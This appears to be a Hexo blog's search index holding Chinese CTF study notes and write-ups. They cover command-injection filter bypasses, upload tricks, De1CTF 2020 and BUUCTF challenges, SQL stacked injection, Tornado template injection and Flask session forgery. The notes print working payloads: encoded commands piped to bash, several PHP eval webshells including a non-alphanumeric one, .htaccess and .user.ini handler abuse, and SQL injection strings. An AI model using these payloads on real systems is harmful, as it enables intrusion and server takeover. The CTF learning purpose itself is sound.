<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>命令执行</title>
      <link href="/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<p>转自<a href="https://blog.csdn.net/qq_43431158/article/details/105422347" target="_blank" rel="noopener">CTF下的命令执行</a></p><h1 id="0x00空格绕过"><a href="#0x00空格绕过" class="headerlink" title="0x00空格绕过"></a><strong>0x00空格绕过</strong></h1><pre><code>常见的绕过符号有：$IFS$9 、${IFS} 、%09(php环境下)、 重定向符&lt;&gt;、&lt;、$IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用</code></pre><h1 id="0x01命令分隔"><a href="#0x01命令分隔" class="headerlink" title="0x01命令分隔"></a><strong>0x01命令分隔</strong></h1><pre><code>%0a  --换行符，需要php环境%0d  --回车符，需要php环境;  --在 shell 中，是”连续指令”&amp;  --不管第一条命令成功与否，都会执行第二条命令&amp;&amp;  --第一条命令成功，第二条才会执行|  --第一条命令的结果，作为第二条命令的输入||  --第一条命令失败，第二条才会执行</code></pre><h1 id="0x02关键词过滤"><a href="#0x02关键词过滤" class="headerlink" title="0x02关键词过滤"></a><strong>0x02关键词过滤</strong></h1><h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a><strong>拼接绕过</strong></h2><pre><code>#执行ls命令：a=l;b=s;$a$b#cat flag文件内容：a=c;b=at;c=f;d=lag;$a$b ${c}${d}#cat test文件内容a=&quot;ccaatt&quot;;b=${a:0:1}${a:2:1}${a:4:1};$b test</code></pre><h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a><strong>编码绕过</strong></h2><pre><code>#base64echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash ==&gt;cat /flagecho Y2F0IC9mbGFn|base64 -d|sh==&gt;cat /flag#hexecho &quot;0x636174202f666c6167&quot; | xxd -r -p|bash ==&gt;cat /flag#oct/字节$(printf &quot;\154\163&quot;) ==&gt;ls$(printf &quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;) ==&gt;cat /flag{printf,&quot;\x63\x61\x74\x20\x2f\x66\x6c\x61\x67&quot;}|\$0 ==&gt;cat /flag#i也可以通过这种方式写马内容为&lt;?php @eval($_POST[&#39;c&#39;]);?&gt;${printf,&quot;\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76&quot;} &gt;&gt; 1.php</code></pre><h2 id="单引号和双引号绕过"><a href="#单引号和双引号绕过" class="headerlink" title="单引号和双引号绕过"></a><strong>单引号和双引号绕过</strong></h2><pre><code>c&#39;a&#39;t testc&quot;a&quot;t test</code></pre><h2 id="反斜杠绕过"><a href="#反斜杠绕过" class="headerlink" title="反斜杠绕过"></a><strong>反斜杠绕过</strong></h2><pre><code>ca\t test</code></pre><h2 id="通过-PATH绕过"><a href="#通过-PATH绕过" class="headerlink" title="通过$PATH绕过"></a><strong>通过$PATH绕过</strong></h2><pre><code>#echo $PATH 显示当前PATH环境变量，该变量的值由一系列以冒号分隔的目录名组成#当执行程序时，shell自动跟据PATH变量的值去搜索该程序#shell在搜索时先搜索PATH环境变量中的第一个目录，没找到再接着搜索，如果找到则执行它，不会再继续搜索echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`echo $PATH| cut -c 8,9`t test</code></pre><p><img src="/2020/05/09/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/image-20200509105742249-1588993641212.png" alt></p><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a><strong>通配符绕过</strong></h2><pre><code>[…]表示匹配方括号之中的任意一个字符{…}表示匹配大括号里面的所有模式，模式之间使用逗号分隔。{…}与[…]有一个重要的区别，当匹配的文件不存在，[…]会失去模式的功能，变成一个单纯的字符串，而{…}依然可以展开</code></pre><pre><code>cat t?stcat te*cat t[a-z]stcat t{a,b,c,d,e,f}st</code></pre><h2 id="linux中查看文件内容的命令"><a href="#linux中查看文件内容的命令" class="headerlink" title="linux中查看文件内容的命令"></a><strong>linux中查看文件内容的命令</strong></h2><pre><code>cat、tac、more、less、head、tail、nl、sed、sort、uniq、od</code></pre><h1 id="0x03内联执行"><a href="#0x03内联执行" class="headerlink" title="0x03内联执行"></a><strong>0x03内联执行</strong></h1><p>内联执行将反引号内命令的输出作为输入执行，类似的还有$(command)</p><pre><code>cat$IFS$9`ls`</code></pre>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php伪协议</title>
      <link href="/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
      <url>/2020/05/08/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 伪协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python</title>
      <link href="/2020/05/06/python/"/>
      <url>/2020/05/06/python/</url>
      
        <content type="html"><![CDATA[<h1 id="md5"><a href="#md5" class="headerlink" title="md5"></a>md5</h1><pre><code class="python">import hashlibdef md5(s):    md5 = hashlib.md5()     md5.update(s.encode(&quot;utf8&quot;))     return md5.hexdigest()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>过滤scandir的检索目录方法</title>
      <link href="/2020/05/06/%E8%BF%87%E6%BB%A4scandir%E7%9A%84%E6%A3%80%E7%B4%A2%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/"/>
      <url>/2020/05/06/%E8%BF%87%E6%BB%A4scandir%E7%9A%84%E6%A3%80%E7%B4%A2%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>过滤了scandir，可以考虑用glob://然后用next索引挨个列目录，脚本如下：</p><pre><code class="python">import requestsn=&#39;$it-&gt;next();&#39;p=&#39;printf(&quot;%s: %.1FK&lt;br /&gt;&quot;, $it-&gt;getFilename(), $it-&gt;getSize()/1024);&#39;for i in range(1,20):    url=&#39;http://129.204.185.9:8848/?c=$it = new DirectoryIterator(&quot;glob:///*&quot;);&#39;    url=url+n*(i-1)+p    #print(url)    print(requests.get(url).text)</code></pre><p><img src="/2020/05/06/%E8%BF%87%E6%BB%A4scandir%E7%9A%84%E6%A3%80%E7%B4%A2%E7%9B%AE%E5%BD%95%E6%96%B9%E6%B3%95/image-20200506114537624.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 安全杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload</title>
      <link href="/2020/05/06/upload/"/>
      <url>/2020/05/06/upload/</url>
      
        <content type="html"><![CDATA[<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><pre><code class="python">import requestsn=&#39;$it-&gt;next();&#39;p=&#39;printf(&quot;%s: %.1FK&lt;br /&gt;&quot;, $it-&gt;getFilename(), $it-&gt;getSize()/1024);&#39;for i in range(1,10):    url=&#39;http://129.204.185.9:8848/?c=session_start();$_SESSION[&quot;b&quot;]=&quot;|N;&lt;?php eval(\$_POST[0]);?&gt;&quot;;$it = new DirectoryIterator(&quot;glob:///tmp/*&quot;);&#39;    url=url+n*(i-1)+p    #print(url)    print(requests.get(url).text)</code></pre><h1 id="htaccess"><a href="#htaccess" class="headerlink" title=".htaccess"></a>.htaccess</h1><pre><code>Addtype application/x-httpd-p\hp .jpg</code></pre><h1 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h1><pre><code>GIF89a                  //绕过exif_imagetype()auto_prepend_file=a.jpg //指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。auto_append_file=a.jpg  //解析后进行包含</code></pre><p>然后再上传<code>a.jpg</code></p><pre><code class="php">0x00GIF89a  &lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;0x01#define test_width 16#define test_height 7&lt;script language=&#39;php&#39;&gt; @eval($_POST[&#39;pass&#39;]);&lt;/script&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>De1CTF 2020</title>
      <link href="/2020/05/06/De1CTF-2020/"/>
      <url>/2020/05/06/De1CTF-2020/</url>
      
        <content type="html"><![CDATA[<p>赛后学习</p><p>参考:</p><p><a href="https://www.cnblogs.com/W4nder/p/12829102.html" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/p/12829102.html</a></p><p><a href="https://www.cnblogs.com/poing/p/12831304.html" target="_blank" rel="noopener">https://www.cnblogs.com/poing/p/12831304.html</a></p><h1 id="check-in"><a href="#check-in" class="headerlink" title="check in"></a>check in</h1><h2 id="知识点：-htaccess上传"><a href="#知识点：-htaccess上传" class="headerlink" title="知识点：.htaccess上传"></a>知识点：.htaccess上传</h2><p>waf：</p><p><img src="/2020/05/06/De1CTF-2020/image-20200506105826591.png" alt></p><p>上传.htaccess</p><p>过滤了ph，用换行进行拼接</p><pre><code>Addtype application/x-httpd-p\hp .jpg</code></pre><p><img src="/2020/05/06/De1CTF-2020/image-20200506111914464.png" alt></p><p>shell内容里的php用短标签绕过：</p><pre><code class="php">&lt;?=eval($_REQUEST[1]);</code></pre><p><code>&lt;?=</code>    等价于    <code>&lt;?php echo</code></p><p>从php 5.4.0开始，&lt;?=总是可用的</p><p><img src="/2020/05/06/De1CTF-2020/image-20200506111936759.png" alt></p><p><img src="/2020/05/06/De1CTF-2020/image-20200506111850688.png" alt></p><p>htaccess启用cgi，执行bash脚本：</p><pre><code>Options +ExecCGIAddHandler cgi-script .sh</code></pre><pre><code class="bash">#!/bin/bashecho &quot;Content-Type: text/plain&quot;echo &quot;&quot;cat /flagexit 0</code></pre><h1 id="Hard-Pentest-1"><a href="#Hard-Pentest-1" class="headerlink" title="Hard_Pentest_1"></a>Hard_Pentest_1</h1><h2 id="知识点：无字母数字webshell，内网渗透"><a href="#知识点：无字母数字webshell，内网渗透" class="headerlink" title="知识点：无字母数字webshell，内网渗透"></a>知识点：无字母数字webshell，内网渗透</h2><p>源码：</p><pre><code class="php"> &lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = &quot;uploads/&quot;. md5(&quot;De1CTF2020&quot;.$_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);if($_POST[&quot;submit&quot;]){    if (($_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 2048) &amp;&amp; Check()){        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0){            die($_FILES[&quot;file&quot;][&quot;error&quot;]);        }        else{            $filename=md5($_SERVER[&#39;REMOTE_ADDR&#39;]).&quot;_&quot;.$_FILES[&quot;file&quot;][&quot;name&quot;];            move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $filename);            echo &quot;save in:&quot; . $sandbox.&quot;/&quot; . $filename;        }    }    else{        echo &quot;Not Allow!&quot;;    }}function Check(){    $BlackExts = array(&quot;php&quot;);//后缀不能是php    $ext = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]);    $exts = trim(end($ext));    $file_content = file_get_contents($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);    //内容不能包含字母数字分号等    if(!preg_match(&#39;/[a-z0-9;~^`&amp;|]/is&#39;,$file_content)  &amp;&amp;         !in_array($exts, $BlackExts) &amp;&amp;         !preg_match(&#39;/\.\./&#39;,$_FILES[&quot;file&quot;][&quot;name&quot;])) {          return true;    }    return false;}?&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;title&gt;upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt;    &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>webshell：(利用array取值，逐次++，拼接POST)</p><pre><code class="php">&lt;?=$_=[]?&gt;&lt;?=$_=@&quot;$_&quot;?&gt;&lt;?=$_=$_[&#39;!&#39;==&#39;@&#39;]?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?= $___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt;&lt;?=$____=&#39;_&#39;?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt;&lt;?=$_=$$____?&gt;&lt;?=$_[__]($_[_],$_[___])?&gt;</code></pre><p><img src="/2020/05/06/De1CTF-2020/image-20200506100940076.png" alt></p><p>上传之后再写入shell：</p><pre><code class="php">__=system&amp;_=echo ^&lt;?php eval($_REQUEST[a]); &gt; a.php</code></pre>]]></content>
      
      
      <categories>
          
          <category> writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> upload </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF 平台</title>
      <link href="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/"/>
      <url>/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://buuoj.cn/challenges" target="_blank" rel="noopener">BUUCTF平台</a></p><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><pre><code class="php"> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];            if (! isset($page) || !is_string($page)) {                echo &quot;you can&#39;t see it&quot;;                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)            );//取第一个？前面的内容            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)            );            if (in_array($_page, $whitelist)) {                return true;            }            echo &quot;you can&#39;t see it&quot;;            return false;        }    }    if (! empty($_REQUEST[&#39;file&#39;])        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])    ) {        include $_REQUEST[&#39;file&#39;];        exit;    } else {        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;    }  ?&gt; </code></pre><p><code>payload:file=source.php?../../../../../../ffffllllaaaagggg</code><br>原理是<code>source.php?</code>被当成目录，往上跳目录即可</p><p>phpmyadmin4.8.1远程文件包含漏洞(CVE-2018-12613)</p><h1 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h1><h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p><code>waf：preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></p><p><code>1&#39;;show databases;</code></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506093253860.png" alt></p><p><code>1&#39;;show tables;</code></p><p>查询数据库supersqli<br><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506093344815.png" alt><br>表名1919810931114514、words<br>猜测后台SQL语句应该为：<br>select * from supersqli.words where id=’’ ;</p><h2 id="方法1："><a href="#方法1：" class="headerlink" title="方法1："></a>方法1：</h2><p>将1919810931114514表改名为words，这样在后台SQL语句不变的情况下仍然可以查询得到flag的内容<br>`payload:’</p><pre><code>1&#39;;alter table `1919810931114514` add `id` INT(11) NOT NULL DEFAULT &#39;1&#39; after `flag`;rename table words to xxx;rename table `1919810931114514` to words;desc words;</code></pre><p>由于1919810931114514表中没有id列，先加上，再改名，接着查询id=1即可获得flag</p><h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p><code>payload:</code></p><pre><code>1&#39;;create procedure vk()begin  Set @v_sql=concat(&#39;sel&#39;,&#39;ect * from `1919810931114514`;&#39;);  Prepare stmt from @v_sql;  EXECUTE stmt;  deallocate Prepare stmt;end;call vk();-- -</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506093442067.png" alt></p><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><h2 id="堆叠注入-1"><a href="#堆叠注入-1" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><p>赛后源码：</p><pre><code class="php">&lt;?php    session_start();    include_once &quot;config.php&quot;;    $post = array();    $get = array();    global $MysqlLink;    //GetPara();    $MysqlLink = mysqli_connect(&quot;localhost&quot;,$datauser,$datapass);    if(!$MysqlLink){        die(&quot;Mysql Connect Error!&quot;);    }    $selectDB = mysqli_select_db($MysqlLink,$dataName);    if(!$selectDB){        die(&quot;Choose Database Error!&quot;);    }    foreach ($_POST as $k=&gt;$v){        if(!empty($v)&amp;&amp;is_string($v)){            $post[$k] = trim(addslashes($v));        }    }    foreach ($_GET as $k=&gt;$v){        }    }    //die();    ?&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;a&gt; Give me your flag, I will tell you if the flag is right. &lt;/ a&gt;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&lt;input type=&quot;text&quot; name=&quot;query&quot;&gt;&lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php    if(isset($post[&#39;query&#39;])){        $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&amp;|\&quot;&quot;;        //var_dump(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;]));        if(preg_match(&quot;/{$BlackList}/is&quot;,$post[&#39;query&#39;])){            //echo $post[&#39;query&#39;];            die(&quot;Nonono.&quot;);        }        if(strlen($post[&#39;query&#39;])&gt;40){            die(&quot;Too long.&quot;);        }        $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;;        mysqli_multi_query($MysqlLink,$sql);        do{            if($res = mysqli_store_result($MysqlLink)){                while($row = mysqli_fetch_row($res)){                    print_r($row);                }            }        }while(@mysqli_next_result($MysqlLink));    }    ?&gt;</code></pre><p>看到mysql_multi_query()，可以堆叠注入</p><p>预期解：</p><p>通过设置sql_mode为PIPES_AS_CONCAT后可改变’||’的含义为连接字符串。</p><blockquote><p>在oracle 缺省支持 通过 ‘ || ’ 来实现字符串拼接，但在mysql 缺省不支持。需要调整mysql 的sql_mode 模式：pipes_as_concat 来实现oracle 的一些功能</p></blockquote><p>原本||为或运算符，查询到数据后即跳过后面flag的查询，通过改变||含义可同时查询。</p><p>payload：</p><pre><code class="sql">1;set sql_mode=PIPES_AS_CONCAT;select 1</code></pre><p>非预期：</p><p>payload：</p><pre><code class="sql">*,1</code></pre><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><h2 id="tornado模板注入"><a href="#tornado模板注入" class="headerlink" title="tornado模板注入"></a>tornado模板注入</h2><p>url形式：</p><p>http://<em>.</em>…../file?filename=…&amp;filehash=…</p><p>提示：</p><table><thead><tr><th>Orz.txt</th><th align="left">render()</th></tr></thead><tbody><tr><td>hint.txt</td><td align="left">md5(cookie_secret + md5(filename))</td></tr><tr><td>flag.txt</td><td align="left">/fllllllllllag</td></tr></tbody></table><p>python <em>SSTI</em> <em>tornado</em> render模板注入</p><p><code>handler.settings</code>存放了cookie_secret</p><p>读取：</p><p><code>http://2c242c65-ae5c-47b1-b55d-db7d12a8092c.node3.buuoj.cn/error?msg=</code></p><p><code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;3dc1711e-a7cd-4490-8d97-c5f08de17a41&#39;}</code></p><pre><code class="pyhon">import hashlibdef md5(s):    md5 = hashlib.md5()     md5.update(s.encode(&quot;utf8&quot;))     return md5.hexdigest()if __name__ == &#39;__main__&#39;:    filename = &#39;/fllllllllllllag&#39;    cookie_secret = &#39;3dc1711e-a7cd-4490-8d97-c5f08de17a41&#39;    print(md5(cookie_secret+md5(filename)))</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200506171131986.png" alt></p><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><h2 id="flask-session伪造"><a href="#flask-session伪造" class="headerlink" title="flask session伪造"></a>flask session伪造</h2><p>decode1:</p><pre><code class="python">#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp = payload.rsplit(b&#39;.&#39;, 1)    decompress = False    if payload.startswith(b&#39;.&#39;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ == &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508104620522.png" alt></p><p>decode2：</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508110623682.png" alt></p><p>secret key：</p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508104651636.png" alt></p><p>encode：</p><p><a href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener">https://github.com/noraj/flask-session-cookie-manager</a></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508110338113.png" alt></p><p><img src="/2020/05/06/BUUCTF-%E5%B9%B3%E5%8F%B0/image-20200508104958199.png" alt></p><p>仍未成功，仅记录一下flask session伪造。</p><h2 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h2><p>改密码、注册、登录均使用strlower()来将用户名转小写</p><pre><code class="python">def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>odeprep.prepare函数转换时过程如下：</p><pre><code class="shell">ᴬᴰᴹᴵᴺ -&gt; ADMIN -&gt; admin</code></pre><p>注册ᴬᴰᴹᴵᴺ用户、登录时经过一次strlower()转换为ADMIN；</p><p>再修改密码、再经过一次strlower()转换为admin，即修改了admin的密码。</p><p>字符：<a href="https://unicode-table.com/cn/1D2C/" target="_blank" rel="noopener">https://unicode-table.com/cn/1D2C/</a></p><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><p>源码：</p><pre><code class="php"> &lt;?phperror_reporting(0);if(!isset($_GET[&#39;num&#39;])){    show_source(__FILE__);}else{        $str = $_GET[&#39;num&#39;];        $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;,&#39;\$&#39;,&#39;\\&#39;,&#39;\^&#39;];        foreach ($blacklist as $blackitem) {                if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&#39;echo &#39;.$str.&#39;;&#39;);}?&gt;</code></pre><h2 id="PHP字符串解析特性"><a href="#PHP字符串解析特性" class="headerlink" title="PHP字符串解析特性"></a>PHP字符串解析特性</h2><p>参考：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p><p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><p>1.删除空白符</p><p> 2.将某些字符转换为下划线（包括空格）</p><p>eg:</p><table><thead><tr><th align="left">User input</th><th>Decoded PHP</th><th>variable name</th></tr></thead><tbody><tr><td align="left">%20foo_bar%00</td><td>foo_bar</td><td>foo_bar</td></tr><tr><td align="left">foo%20bar%00</td><td>foo bar</td><td>foo_bar</td></tr><tr><td 